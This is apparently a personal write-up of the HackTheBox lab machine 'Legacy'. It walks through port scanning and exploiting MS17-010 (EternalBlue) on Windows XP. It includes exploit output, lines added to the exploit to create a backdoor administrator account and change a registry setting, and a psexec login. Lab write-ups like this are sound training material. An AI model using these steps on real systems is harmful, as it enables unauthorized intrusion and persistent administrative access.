# HTB: Legacy

***Overview**: Legacy is an easy rated machine on hackthebox, that simply exploits the MS17-010 vulnerability on a server running Microsoft Windows XP SP2 or SP3.*

## Scanning and Enumeration

- So we start by scanning for open ports. Using masscan we scan all 65535 TCP ports and we discover 3 open ports

```shell
┌──(kali㉿kali)-[~/HTB/Legacy]
└─$ sudo masscan -p1-65535 10.10.10.4 --rate=1000 -e tun0 > ports
[sudo] password for kali:

┌──(kali㉿kali)-[~/HTB/Legacy]
└─$ cat ports

┌──(kali㉿kali)-[~/HTB/Legacy]
└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

```

- then we enumerate for the services on the open ports

```shell

- we then conduct a vulnerability scan using Nmap, and we can see that it is vulnerable to ms17-010

## Exploitation: MS17-010

- We could utilize the Eternal blue exploitation using the AutoBlue exploit at [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
- But instead I utilized the exploit [https://github.com/worawit/MS17-010/](https://github.com/worawit/MS17-010/)
- so first of we run the checker to see if it is vulnerable and it is 

```shell
┌──(kali㉿kali)-[/opt/MS17-010]
└─$ python2 checker.py 10.10.10.4               
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_OBJECT_NAME_NOT_FOUND
```

- Since the version is of Windows detected in our OS scan is Microsoft Windows XP SP2 or SP3, we utilize the zzz_exploit.py script and this is because it has been tested on that OS. So when we run it, we see that the only thing it does is to create a file pwned.txt in the root `C:\` directory

```shell
┌──(kali㉿kali)-[/opt/MS17-010]
└─$ python2 zzz_exploit.py 10.10.10.4 spoolss               
Target OS: Windows 5.1
Groom packets

leak next transaction

TRANS2: 0x7ac90

current TOKEN addr: 0xe177f188
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe177f228

creating file c:\pwned.txt on the target
Done
```

- By examining the exploit script, we can see that's what it says in the script, what it does is just create the file pwned.txt at line 975

![](assets/Legacy_assets/Pasted%20image%2020231111142851.png)

- so coming across the blog post at [https://nullsec.us/eternalblue-on-windows-xp/](https://nullsec.us/eternalblue-on-windows-xp/), we can see that we can edit the script by telling it to add a new user and adding the user to the Administrators group

```python
service_exec(conn, r'cmd /c net user gr4y Password /add')
service_exec(conn, r'cmd /c net localgroup Administrators gr4y /add')
service_exec(conn, r'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f')
```

- so lets add the above lines to the script

![](assets/Legacy_assets/Pasted%20image%2020231111143004.png)

- after doing that, we can then utilize psexec to access the machine using the new account created

```shell
impacket-psexec gr4y:Password@10.10.10.4
```

![](assets/Legacy_assets/Pasted%20image%2020231111145156.png)

- we can view the root file and also view the user file
